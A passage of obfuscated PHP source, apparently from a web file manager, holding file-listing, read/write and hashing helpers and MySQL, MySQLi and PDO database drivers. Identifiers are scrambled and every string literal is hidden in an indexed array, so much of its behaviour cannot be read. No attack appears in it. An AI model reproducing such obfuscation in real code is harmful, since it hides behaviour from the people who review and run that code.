isFolder($Õ¿‰†´§) { $Õ¿‰†´§ = $this->iconvSystem($Õ¿‰†´§); return @is_dir($Õ¿‰†´§); } public function listPath($ÙÃ“ü­, $¸èæÜÇú = false) { $ÆĞ©¹áÂ =& $_SERVER[–Ú¬çÁ]; $ÙÃ“ü­ = $this->iconvSystem($ÙÃ“ü­); $ÙÃ“ü­ = rtrim($ÙÃ“ü­, $ÆĞ©¹áÂ[8]) . $ÆĞ©¹áÂ[8]; $«™»­‡ = array($ÆĞ©¹áÂ[82] => array(), $ÆĞ©¹áÂ[83] => array()); if (!($ìÁªøÚ³ = @opendir($ÙÃ“ü­))) { return $«™»­‡; } while (($”ĞÙ×Š = readdir($ìÁªøÚ³)) !== !1) { if ($”ĞÙ×Š == $ÆĞ©¹áÂ[10] || $”ĞÙ×Š == $ÆĞ©¹áÂ[1298]) { continue; } $çÈ×ûù = $ÙÃ“ü­ . $”ĞÙ×Š; if (is_file($çÈ×ûù)) { $«™»­‡[$ÆĞ©¹áÂ[83]][] = $this->fileInfo($çÈ×ûù, $¸èæÜÇú); } else { $«™»­‡[$ÆĞ©¹áÂ[82]][] = $this->folderInfo($çÈ×ûù, $¸èæÜÇú); } } closedir($ìÁªøÚ³); return $«™»­‡; } public function listAll($Ê‚áÅ«Ã, &$åàäàåÚ = array()) { $©ó«Ø¿Ÿ =& $_SERVER[–Ú¬çÁ]; $Ê‚áÅ«Ã = $this->iconvSystem($Ê‚áÅ«Ã); $Ê‚áÅ«Ã = rtrim($Ê‚áÅ«Ã, $©ó«Ø¿Ÿ[8]) . $©ó«Ø¿Ÿ[8]; if (!($’š¨¾öú = @opendir($Ê‚áÅ«Ã))) { return $åàäàåÚ; } while (($äøË§Ò§ = readdir($’š¨¾öú)) !== !1) { if ($äøË§Ò§ == $©ó«Ø¿Ÿ[10] || $äøË§Ò§ == $©ó«Ø¿Ÿ[1298]) { continue; } $§Ûóæğ˜ = $Ê‚áÅ«Ã . $äøË§Ò§; $¥î“¡¾û = is_dir($§Ûóæğ˜) && !is_link($§Ûóæğ˜) ? 1 : 0; $§Ûóæğ˜ = $¥î“¡¾û ? $§Ûóæğ˜ . $©ó«Ø¿Ÿ[8] : $§Ûóæğ˜; $åàäàåÚ[] = array($©ó«Ø¿Ÿ[84] => $§Ûóæğ˜, $©ó«Ø¿Ÿ[75] => $¥î“¡¾û, $©ó«Ø¿Ÿ[85] => intval(@filemtime($§Ûóæğ˜)), $©ó«Ø¿Ÿ[76] => $¥î“¡¾û ? 0 : intval($this->size($§Ûóæğ˜))); if ($¥î“¡¾û) { $this->listAll($§Ûóæğ˜, $åàäàåÚ); } } closedir($’š¨¾öú); return $åàäàåÚ; } public function has($Ê¤ ³ß˜, $Şº­€úÇ = false, $üÊ¨Ï = true) { $¾äß¡Áú =& $_SERVER[–Ú¬çÁ]; $Ê¤ ³ß˜ = $this->iconvSystem($Ê¤ ³ß˜); $Ê¤ ³ß˜ = rtrim($Ê¤ ³ß˜, $¾äß¡Áú[8]) . $¾äß¡Áú[8]; if (!($îî³ãƒå = @opendir($Ê¤ ³ß˜))) { return !1; } $÷çæã€ = 0; $Œ€„ó¨Ø = 0; $ëª€ªœŠ = 0; while (($ÔİÆ¬À = readdir($îî³ãƒå)) !== !1) { if ($ÔİÆ¬À == $¾äß¡Áú[10] || $ÔİÆ¬À == $¾äß¡Áú[1298]) { continue; } $ÉÅûºÆå = $Ê¤ ³ß˜ . $ÔİÆ¬À; if ($Şº­€úÇ) { $ëª€ªœŠ++; if (@is_file($ÉÅûºÆå)) { $÷çæã€++; } else { $Œ€„ó¨Ø++; } if ($ëª€ªœŠ > 10000) { break; } continue; } if ($üÊ¨Ï) { if (@is_file($ÉÅûºÆå)) { return !0; } } else { if (@is_dir($ÉÅûºÆå . $¾äß¡Áú[8])) { return !0; } } } closedir($îî³ãƒå); if ($Şº­€úÇ) { return array($¾äß¡Áú[233] => $÷çæã€, $¾äß¡Áú[234] => $Œ€„ó¨Ø); } return !1; } public function hashSimple($áœ»ä¼ß) { $¦ôÎÂÛƒ =& $_SERVER[–Ú¬çÁ]; if (!$áœ»ä¼ß) { return md5($¦ôÎÂÛƒ[12]); } $áœ»ä¼ß = $this->iconvSystem($áœ»ä¼ß); $íŸŸ„µÖ = $this->size($áœ»ä¼ß); $úê„¦Ã = 200; $Ôó³Í½» = 50; if ($íŸŸ„µÖ <= $úê„¦Ã * $Ôó³Í½») { return $this->hashMd5($áœ»ä¼ß) . $íŸŸ„µÖ; } $ôÍ‚Èıê = $¦ôÎÂÛƒ[12]; $çËµÔöŸ = intval($íŸŸ„µÖ / $Ôó³Í½»); $ŸÍØ˜¼¯ = fopen($áœ»ä¼ß, $¦ôÎÂÛƒ[1386]); if (!$ŸÍØ˜¼¯) { return $ôÍ‚Èıê; } for ($¿Ë×¸‘í = 0; $¿Ë×¸‘í < $Ôó³Í½»; $¿Ë×¸‘í++) { fseek_64($ŸÍØ˜¼¯, $çËµÔöŸ * $¿Ë×¸‘í); $ôÍ‚Èıê .= fread($ŸÍØ˜¼¯, $úê„¦Ã); } fseek_64($ŸÍØ˜¼¯, $íŸŸ„µÖ - $úê„¦Ã); $ôÍ‚Èıê .= fread($ŸÍØ˜¼¯, $úê„¦Ã); fclose($ŸÍØ˜¼¯); return md5($ôÍ‚Èıê) . $íŸŸ„µÖ; } public function getContent($«í×ãèî) { $«í×ãèî = $this->iconvSystem($«í×ãèî); return file_get_contents($«í×ãèî); } public function setContent($ÔöÀ€…á, $¡ƒšáĞ” = '') { $ÔöÀ€…á = $this->iconvSystem($ÔöÀ€…á); $æÛ·‚ÕÊ = @file_put_contents($ÔöÀ€…á, $¡ƒšáĞ”, LOCK_EX); clearstatcache(); @chmod($ÔöÀ€…á, $this->pathAuth); return $æÛ·‚ÕÊ === !1 ? !1 : !0; } public function fileSubstr($Í¿‚°Â, $Î£–‘§ = 0, $š“˜ÌÌõ = false) { $Øå®Şœè =& $_SERVER[–Ú¬çÁ]; $Í¿‚°Â = $this->iconvSystem($Í¿‚°Â); if ($š“˜ÌÌõ === !1) { $š“˜ÌÌõ = $this->size($Í¿‚°Â); } if ($š“˜ÌÌõ <= 0) { return $Øå®Şœè[12]; } $¤Ş…‹È¿ = fopen($Í¿‚°Â, $Øå®Şœè[1386]); if (!$¤Ş…‹È¿) { return !1; } fseek_64($¤Ş…‹È¿, $Î£–‘§); $æò”‹Ëé = fread($¤Ş…‹È¿, $š“˜ÌÌõ); fclose($¤Ş…‹È¿); return $æò”‹Ëé; } public function upload($•ÙêÄ•æ, $–šĞ€‰¢, $úº˜¾ßê = false, $ÁŞ‚ïëµ = REPEAT_REPLACE) { if ($úº˜¾ßê) { return $this->moveFile($–šĞ€‰¢, $•ÙêÄ•æ); } return $this->copyFile($–šĞ€‰¢, $•ÙêÄ•æ); } public function setModifyTime($ÂĞ¯Åì—, $¬¨ûØÊ¤ = '') { @touch($ÂĞ¯Åì—, intval($¬¨ûØÊ¤)); } public function download($Œ¼Ë¿Õó, $¹ó¼â¬İ) { return $this->iconvSystem($Œ¼Ë¿Õó); } } goto Eˆ¸±²ó®…; bôÒ¨‘åå£: class DbMysql extends Db { public function __construct($¾ÉÈ×’Æ = '') { $üõ¨‘»Ü =& $_SERVER[–Ú¬çÁ]; if (!extension_loaded($üõ¨‘»Ü[824])) { think_exception(think_lang($üõ¨‘»Ü[14]) . $üõ¨‘»Ü[905]); } if (!empty($¾ÉÈ×’Æ)) { $this->config = $¾ÉÈ×’Æ; if (empty($this->config[$üõ¨‘»Ü[17]])) { $this->config[$üõ¨‘»Ü[17]] = $üõ¨‘»Ü[12]; } } } public function connect($œÀ‹…Ş¡ = '', $ô«µâË„ = 0, $Èıø ·™ = false) { $öÎ½Ãµ“ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->linkID[$ô«µâË„])) { if (empty($œÀ‹…Ş¡)) { $œÀ‹…Ş¡ = $this->config; } $ìäœ‚ˆõ = $œÀ‹…Ş¡[$öÎ½Ãµ“[906]] . ($œÀ‹…Ş¡[$öÎ½Ãµ“[907]] ? "\x3a{$œÀ‹…Ş¡[$öÎ½Ãµ“[907]]}" : $öÎ½Ãµ“[12]); $‡ŒÊšôÜ = !empty($œÀ‹…Ş¡[$öÎ½Ãµ“[17]][$öÎ½Ãµ“[18]]) ? $œÀ‹…Ş¡[$öÎ½Ãµ“[17]][$öÎ½Ãµ“[18]] : $this->pconnect; if ($‡ŒÊšôÜ) { $this->linkID[$ô«µâË„] = mysql_pconnect($ìäœ‚ˆõ, $œÀ‹…Ş¡[$öÎ½Ãµ“[908]], $œÀ‹…Ş¡[$öÎ½Ãµ“[909]], 131072); } else { $this->linkID[$ô«µâË„] = mysql_connect($ìäœ‚ˆõ, $œÀ‹…Ş¡[$öÎ½Ãµ“[908]], $œÀ‹…Ş¡[$öÎ½Ãµ“[909]], !0, 131072); } if (!$this->linkID[$ô«µâË„] || !empty($œÀ‹…Ş¡[$öÎ½Ãµ“[21]]) && !mysql_select_db($œÀ‹…Ş¡[$öÎ½Ãµ“[21]], $this->linkID[$ô«µâË„])) { think_exception(mysql_error()); } $®Ô»«Ó‚ = mysql_get_server_info($this->linkID[$ô«µâË„]); mysql_query($öÎ½Ãµ“[910] . think_config($öÎ½Ãµ“[911]) . $öÎ½Ãµ“[58], $this->linkID[$ô«µâË„]); if ($®Ô»«Ó‚ > $öÎ½Ãµ“[912]) { mysql_query($öÎ½Ãµ“[913], $this->linkID[$ô«µâË„]); } $this->connected = !0; if (1 != think_config($öÎ½Ãµ“[22])) { unset($this->config); } } return $this->linkID[$ô«µâË„]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($­ÈÈ¦Êå) { $î‘¥¦ÅÙ =& $_SERVER[–Ú¬çÁ]; if (0 === stripos($­ÈÈ¦Êå, $î‘¥¦ÅÙ[317])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­ÈÈ¦Êå; if ($this->queryID) { $this->free(); } think_action_status($î‘¥¦ÅÙ[23], 1); think_status($î‘¥¦ÅÙ[24]); $this->queryID = mysql_query($­ÈÈ¦Êå, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($„ÒÎÔ€) { $Êîõ¦Ä» =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $„ÒÎÔ€; if ($this->queryID) { $this->free(); } think_action_status($Êîõ¦Ä»[25], 1); think_status($Êîõ¦Ä»[24]); $ÌíîÌöà = mysql_query($„ÒÎÔ€, $this->_linkID); $this->debug(); if (!1 === $ÌíîÌöà) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[–Ú¬çÁ][914], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚İ‡‹Ó’ = mysql_query($_SERVER[–Ú¬çÁ][915], $this->_linkID); $this->transTimes = 0; if (!$‚İ‡‹Ó’) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‡ˆ‚ƒº¥ = mysql_query($_SERVER[–Ú¬çÁ][916], $this->_linkID); $this->transTimes = 0; if (!$‡ˆ‚ƒº¥) { $this->error(); return !1; } } return !0; } private function getAll() { $øÓûš€‹ = array(); if ($this->numRows > 0) { while ($Ñò¹â·à = mysql_fetch_assoc($this->queryID)) { $øÓûš€‹[] = $Ñò¹â·à; } mysql_data_seek($this->queryID, 0); } return $øÓûš€‹; } public function getFields($«ºÜº¶) { $¬¿Ÿ˜áÚ =& $_SERVER[–Ú¬çÁ]; $°–¿Éì£ = $this->query($¬¿Ÿ˜áÚ[917] . $this->parseKey($«ºÜº¶)); $´¦°Òï™ = array(); if ($°–¿Éì£) { foreach ($°–¿Éì£ as $Ÿ¯ù»Í¤ => $ÃŒÈÒó) { $´¦°Òï™[$ÃŒÈÒó[$¬¿Ÿ˜áÚ[31]]] = array($¬¿Ÿ˜áÚ[32] => $ÃŒÈÒó[$¬¿Ÿ˜áÚ[31]], $¬¿Ÿ˜áÚ[33] => $ÃŒÈÒó[$¬¿Ÿ˜áÚ[34]], $¬¿Ÿ˜áÚ[35] => (bool) (strtoupper($ÃŒÈÒó[$¬¿Ÿ˜áÚ[36]]) === $¬¿Ÿ˜áÚ[918]), $¬¿Ÿ˜áÚ[37] => $ÃŒÈÒó[$¬¿Ÿ˜áÚ[38]], $¬¿Ÿ˜áÚ[39] => strtolower($ÃŒÈÒó[$¬¿Ÿ˜áÚ[40]]) == $¬¿Ÿ˜áÚ[41], $¬¿Ÿ˜áÚ[42] => strtolower($ÃŒÈÒó[$¬¿Ÿ˜áÚ[43]]) == $¬¿Ÿ˜áÚ[44]); } } return $´¦°Òï™; } public function getTables($Ó°ğ´°¢ = '') { $­ñ‡Ì“‰ =& $_SERVER[–Ú¬çÁ]; if (!empty($Ó°ğ´°¢)) { $È£«¼Æß = $­ñ‡Ì“‰[919] . $Ó°ğ´°¢ . $­ñ‡Ì“‰[920]; } else { $È£«¼Æß = $­ñ‡Ì“‰[921]; } $·ôÁ” = $this->query($È£«¼Æß); $ˆ˜Ÿ¬êß = array(); foreach ($·ôÁ” as $æÃÃ—–µ => $’Ô§Ã‰¥) { $ˆ˜Ÿ¬êß[$æÃÃ—–µ] = current($’Ô§Ã‰¥); } return $ˆ˜Ÿ¬êß; } public function replace($÷˜ú¢ƒÁ, $¢¢Ÿ‚¸† = array()) { $½ç…Ç¢Æ =& $_SERVER[–Ú¬çÁ]; foreach ($÷˜ú¢ƒÁ as $™»ÂŞÚ‡ => $Ò“…êùˆ) { $š¶‚Ù¦º = $this->parseValue($Ò“…êùˆ); if (is_scalar($š¶‚Ù¦º)) { $£‘ìëÕú[] = $š¶‚Ù¦º; $×ÜıĞ²†[] = $this->parseKey($™»ÂŞÚ‡); } } $ê–ª†ß = $½ç…Ç¢Æ[922] . $this->parseTable($¢¢Ÿ‚¸†[$½ç…Ç¢Æ[332]]) . $½ç…Ç¢Æ[923] . implode($½ç…Ç¢Æ[50], $×ÜıĞ²†) . $½ç…Ç¢Æ[924] . implode($½ç…Ç¢Æ[50], $£‘ìëÕú) . $½ç…Ç¢Æ[925]; return $this->execute($ê–ª†ß); } public function insertAll($¿¥ªá‘á, $–å¯é ë = array(), $„şŒ»ßº = false) { $ ß£¯¦À =& $_SERVER[–Ú¬çÁ]; if (!is_array($¿¥ªá‘á[0])) { return !1; } $ä£·ëÅ = array_keys($¿¥ªá‘á[0]); $œèÉ“Ò = array(); foreach ($¿¥ªá‘á as $ÓŠ†¡ˆá) { $„¬õı€µ = array(); foreach ($ÓŠ†¡ˆá as $ÖË÷ô» => $æ£…¥åÚ) { $æ£…¥åÚ = $this->parseValue($æ£…¥åÚ); if (is_scalar($æ£…¥åÚ)) { $„¬õı€µ[] = $æ£…¥åÚ; } } $œèÉ“Ò[] = $ ß£¯¦À[313] . implode($ ß£¯¦À[50], $„¬õı€µ) . $ ß£¯¦À[925]; } array_walk($ä£·ëÅ, array($this, $ ß£¯¦À[926])); $Ïñ©Œ = ($„şŒ»ßº ? $ ß£¯¦À[927] : $ ß£¯¦À[928]) . $ ß£¯¦À[929] . $this->parseTable($–å¯é ë[$ ß£¯¦À[332]]) . $ ß£¯¦À[923] . implode($ ß£¯¦À[50], $ä£·ëÅ) . $ ß£¯¦À[930] . implode($ ß£¯¦À[50], $œèÉ“Ò); return $this->execute($Ïñ©Œ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ğ¹’çÅƒ =& $_SERVER[–Ú¬çÁ]; $this->error = mysql_errno() . $Ğ¹’çÅƒ[4] . mysql_error($this->_linkID); if ($Ğ¹’çÅƒ[12] != $this->queryStr) { $this->error .= LNG($Ğ¹’çÅƒ[48]) . $this->queryStr; } think_trace($this->error, $Ğ¹’çÅƒ[12], $Ğ¹’çÅƒ[49]); return $this->error; } public function escapeString($Ã‹¿Ë×Á) { if ($this->_linkID) { return mysql_real_escape_string($Ã‹¿Ë×Á, $this->_linkID); } else { return mysql_escape_string($Ã‹¿Ë×Á); } } public function parseKey(&$â§ç­», $ÖÃŞÒ = true) { $¢òÈ‚“ =& $_SERVER[–Ú¬çÁ]; if ($ÖÃŞÒ) { $â§ç­» = $this->parseKeyCheck($â§ç­»); } if ($â§ç­» != $¢òÈ‚“[213] && !preg_match($¢òÈ‚“[931], $â§ç­»)) { $â§ç­» = $¢òÈ‚“[438] . trim($â§ç­», $¢òÈ‚“[438]) . $¢òÈ‚“[438]; } return $â§ç­»; } } class DbMysqli extends Db { public function __construct($äÚ•Š¹È = '') { $¶æî’ =& $_SERVER[–Ú¬çÁ]; if (!extension_loaded($¶æî’[932])) { think_exception(think_lang($¶æî’[14]) . $¶æî’[933]); } if (!empty($äÚ•Š¹È)) { $this->config = $äÚ•Š¹È; if (empty($this->config[$¶æî’[17]])) { $this->config[$¶æî’[17]] = $¶æî’[12]; } } } public function connect($ÛÛ®šÈ = '', $«Ğ”Ù¸Ù = 0) { $¦¿Î¯¦ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->linkID[$«Ğ”Ù¸Ù])) { if (empty($ÛÛ®šÈ)) { $ÛÛ®šÈ = $this->config; } $this->linkID[$«Ğ”Ù¸Ù] = new mysqli($ÛÛ®šÈ[$¦¿Î¯¦[906]], $ÛÛ®šÈ[$¦¿Î¯¦[908]], $ÛÛ®šÈ[$¦¿Î¯¦[909]], $ÛÛ®šÈ[$¦¿Î¯¦[21]], $ÛÛ®šÈ[$¦¿Î¯¦[907]] ? intval($ÛÛ®šÈ[$¦¿Î¯¦[907]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¶ƒ˜Ìù = $this->linkID[$«Ğ”Ù¸Ù]->server_version; $this->linkID[$«Ğ”Ù¸Ù]->query($¦¿Î¯¦[910] . think_config($¦¿Î¯¦[911]) . $¦¿Î¯¦[58]); if ($¶ƒ˜Ìù > $¦¿Î¯¦[912]) { $this->linkID[$«Ğ”Ù¸Ù]->query($¦¿Î¯¦[913]); } $this->connected = !0; if (1 != think_config($¦¿Î¯¦[22])) { unset($this->config); } } return $this->linkID[$«Ğ”Ù¸Ù]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($‰øîùÑ) { $°¯úúíÒ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰øîùÑ; if ($this->queryID) { $this->free(); } think_action_status($°¯úúíÒ[23], 1); think_status($°¯úúíÒ[24]); $this->queryID = $this->_linkID->query($‰øîùÑ); if ($this->_linkID->more_results()) { while (($±ïÈÕ§Ø = $this->_linkID->next_result()) != NULL) { $±ïÈÕ§Ø->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($…Ì¶àûı) { $Ù£Â‡ö§ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…Ì¶àûı; if ($this->queryID) { $this->free(); } think_action_status($Ù£Â‡ö§[25], 1); think_status($Ù£Â‡ö§[24]); $ğàı¸ï‡ = $this->_linkID->query($…Ì¶àûı); $this->debug(); if (!1 === $ğàı¸ï‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ç’†À´‚ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ç’†À´‚) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $üÕ‘‰ßÕ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$üÕ‘‰ßÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $¿è…Ö°ˆ = array(); if ($this->numRows > 0) { for ($ü‘üÃË = 0; $ü‘üÃË < $this->numRows; $ü‘üÃË++) { $¿è…Ö°ˆ[$ü‘üÃË] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¿è…Ö°ˆ; } public function getFields($•ÙÅÆ ÷) { $ Ö†ÅÁò =& $_SERVER[–Ú¬çÁ]; $ğÛã¡€• = $this->query($ Ö†ÅÁò[917] . $this->parseKey($•ÙÅÆ ÷)); $ãÙšçïÜ = array(); if ($ğÛã¡€•) { foreach ($ğÛã¡€• as $¿·ãƒœü => $Ã…Ïë§š) { $ãÙšçïÜ[$Ã…Ïë§š[$ Ö†ÅÁò[31]]] = array($ Ö†ÅÁò[32] => $Ã…Ïë§š[$ Ö†ÅÁò[31]], $ Ö†ÅÁò[33] => $Ã…Ïë§š[$ Ö†ÅÁò[34]], $ Ö†ÅÁò[35] => (bool) ($Ã…Ïë§š[$ Ö†ÅÁò[36]] === $ Ö†ÅÁò[12]), $ Ö†ÅÁò[37] => $Ã…Ïë§š[$ Ö†ÅÁò[38]], $ Ö†ÅÁò[39] => strtolower($Ã…Ïë§š[$ Ö†ÅÁò[40]]) == $ Ö†ÅÁò[41], $ Ö†ÅÁò[42] => strtolower($Ã…Ïë§š[$ Ö†ÅÁò[43]]) == $ Ö†ÅÁò[44]); } } return $ãÙšçïÜ; } public function getTables($òàØ‚šğ = '') { $ã€Î‰Äğ =& $_SERVER[–Ú¬çÁ]; $ï£Í’õ³ = !empty($òàØ‚šğ) ? $ã€Î‰Äğ[919] . $òàØ‚šğ . $ã€Î‰Äğ[920] : $ã€Î‰Äğ[921]; $î©’¶Êß = $this->query($ï£Í’õ³); $ıú«æ = array(); if ($î©’¶Êß) { foreach ($î©’¶Êß as $ÑÓ°±¤‰ => $èÌÏ…†Š) { $ıú«æ[$ÑÓ°±¤‰] = current($èÌÏ…†Š); } } return $ıú«æ; } public function replace($ùª±ó©Ã, $»Û¦á‚‘ = array()) { $ª¿µÑú¼ =& $_SERVER[–Ú¬çÁ]; foreach ($ùª±ó©Ã as $çÙåš²‰ => $éúøÖ‡Ë) { $†«îææÂ = $this->parseValue($éúøÖ‡Ë); if (is_scalar($†«îææÂ)) { $»´²ÙšŒ[] = $†«îææÂ; $‰…Á¶‚õ[] = $this->parseKey($çÙåš²‰); } } $”ıÅÃú¼ = $ª¿µÑú¼[922] . $this->parseTable($»Û¦á‚‘[$ª¿µÑú¼[332]]) . $ª¿µÑú¼[923] . implode($ª¿µÑú¼[50], $‰…Á¶‚õ) . $ª¿µÑú¼[924] . implode($ª¿µÑú¼[50], $»´²ÙšŒ) . $ª¿µÑú¼[925]; return $this->execute($”ıÅÃú¼); } public function insertAll($©ñåøô, $˜µ¦ïŸ¢ = array(), $«‘»¾Ş = false) { $Ùà¹í =& $_SERVER[–Ú¬çÁ]; if (!is_array($©ñåøô[0])) { return !1; } $éà´Şº© = array_keys($©ñåøô[0]); $×³îÂ©º = array(); foreach ($©ñåøô as $ÁÅñ¦›) { $ßşì‚ö = array(); foreach ($ÁÅñ¦› as $ÚÑ¢ù¡ => $ŠŞÁ‹»¼) { $ŠŞÁ‹»¼ = $this->parseValue($ŠŞÁ‹»¼); if (is_scalar($ŠŞÁ‹»¼)) { $ßşì‚ö[] = $ŠŞÁ‹»¼; } } $×³îÂ©º[] = $Ùà¹í[313] . implode($Ùà¹í[50], $ßşì‚ö) . $Ùà¹í[925]; } array_walk($éà´Şº©, array($this, $Ùà¹í[926])); $Ë²ù¢å· = $«‘»¾Ş ? $Ùà¹í[927] : $Ùà¹í[928]; $»Õ¬Ç¯Ø = $Ë²ù¢å· . $Ùà¹í[929] . $this->parseTable($˜µ¦ïŸ¢[$Ùà¹í[332]]) . $Ùà¹í[923] . implode($Ùà¹í[50], $éà´Şº©) . $Ùà¹í[930] . implode($Ùà¹í[50], $×³îÂ©º); return $this->execute($»Õ¬Ç¯Ø); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $µãç˜—ß =& $_SERVER[–Ú¬çÁ]; $this->error = $this->_linkID->errno . $µãç˜—ß[4] . $this->_linkID->error; if ($µãç˜—ß[12] != $this->queryStr) { $this->error .= LNG($µãç˜—ß[48]) . $this->queryStr; } think_trace($this->error, $µãç˜—ß[12], $µãç˜—ß[49]); return $this->error; } public function escapeString($¬ÀÖ»è) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¬ÀÖ»è); } else { return addslashes($¬ÀÖ»è); } } public function parseKey(&$˜ª³î”†, $¯–°ı“ = true) { $«Å½í£Ñ =& $_SERVER[–Ú¬çÁ]; if ($¯–°ı“) { $˜ª³î”† = $this->parseKeyCheck($˜ª³î”†); } if ($˜ª³î”† != $«Å½í£Ñ[213] && !preg_match($«Å½í£Ñ[931], $˜ª³î”†)) { $˜ª³î”† = $«Å½í£Ñ[438] . trim($˜ª³î”†, $«Å½í£Ñ[438]) . $«Å½í£Ñ[438]; } return $˜ª³î”†; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Û¬òÎÓÉ = '') { $Àâ‡§©è =& $_SERVER[–Ú¬çÁ]; if (!class_exists($Àâ‡§©è[934])) { think_exception(think_lang($Àâ‡§©è[14]) . $Àâ‡§©è[935]); } if (!empty($Û¬òÎÓÉ)) { $this->config = $Û¬òÎÓÉ; if (empty($this->config[$Àâ‡§©è[17]])) { $this->config[$Àâ‡§©è[17]] = array(); } } } public function connect($¯Ãºï² = '', $ºé®ˆœ = 0) { $‡“·ÃÙ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->linkID[$ºé®ˆœ])) { if (empty($¯Ãºï²)) { $¯Ãºï² = $this->config; } $¬ßÓ¼…– = !empty($¯Ãºï²[$‡“·ÃÙ[17]][$‡“·ÃÙ[18]]) ? $¯Ãºï²[$‡“·ÃÙ[17]][$‡“·ÃÙ[18]] : $this->pconnect; if ($¬ßÓ¼…–) { $¯Ãºï²[$‡“·ÃÙ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ºé®ˆœ] = new PDO($¯Ãºï²[$‡“·ÃÙ[936]], $¯Ãºï²[$‡“·ÃÙ[908]], $¯Ãºï²[$‡“·ÃÙ[909]], $¯Ãºï²[$‡“·ÃÙ[17]]); } catch (PDOException $Ì´æ‰éê) { think_exception($Ì´æ‰éê->getMessage()); } $this->dbType = $this->_getDsnType($¯Ãºï²[$‡“·ÃÙ[936]]); if (in_array($this->dbType, array($‡“·ÃÙ[937], $‡“·ÃÙ[938], $‡“·ÃÙ[939], $‡“·ÃÙ[940]))) { think_exception($‡“·ÃÙ[941] . $this->dbType . $‡“·ÃÙ[942] . $this->dbType . $‡“·ÃÙ[943]); } if (!$this->linkID[$ºé®ˆœ]) { think_exception($‡“·ÃÙ[944]); } try { $this->linkID[$ºé®ˆœ]->exec($‡“·ÃÙ[945] . think_config($‡“·ÃÙ[911])); } catch (Exception $Ì´æ‰éê) { } $this->connected = !0; if (1 != think_config($‡“·ÃÙ[22])) { unset($this->config); } } return $this->linkID[$ºé®ˆœ]; } public function free() { $this->PDOStatement = null; } public function query($Ù¢Ê§èÕ, $é…å„­ = array()) { $Ä·ü„£ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù¢Ê§èÕ; if (!empty($é…å„­)) { $this->queryStr .= $Ä·ü„£[946] . print_r($é…å„­, !0) . $Ä·ü„£[947]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ä·ü„£[23], 1); think_status($Ä·ü„£[24]); $this->PDOStatement = $this->_linkID->prepare($Ù¢Ê§èÕ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $½¼»ÅÙŞ = $this->PDOStatement->execute($é…å„­); $this->debug(); if (!1 === $½¼»ÅÙŞ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ïì±œ„”, $Ì¯˜»Ñ’ = array()) { $³ˆô¸œ¸ =& $_SERVER[–Ú¬çÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ïì±œ„”; if (!empty($Ì¯˜»Ñ’)) { $this->queryStr .= $³ˆô¸œ¸[946] . print_r($Ì¯˜»Ñ’, !0) . $³ˆô¸œ¸[947]; } $Ğœ’İæˆ = !1; if ($this->dbType == $³ˆô¸œ¸[940]) { if (preg_match($³ˆô¸œ¸[948], $this->queryStr, $üÛßÛ¸Ù)) { $this->table = think_config($³ˆô¸œ¸[949]) . str_ireplace(think_config($³ˆô¸œ¸[950]), $³ˆô¸œ¸[431], $üÛßÛ¸Ù[2]); $Ğœ’İæˆ = (bool) $this->query($³ˆô¸œ¸[951] . strtoupper($this->table) . $³ˆô¸œ¸[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($³ˆô¸œ¸[25], 1); think_status($³ˆô¸œ¸[24]); $this->PDOStatement = $this->_linkID->prepare($ïì±œ„”); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¦î‰æ§• = $this->PDOStatement->execute($Ì¯˜»Ñ’); $this->debug(); if (!1 === $¦î‰æ§•) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ğœ’İæˆ || preg_match($³ˆô¸œ¸[952], $ïì±œ„”)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if 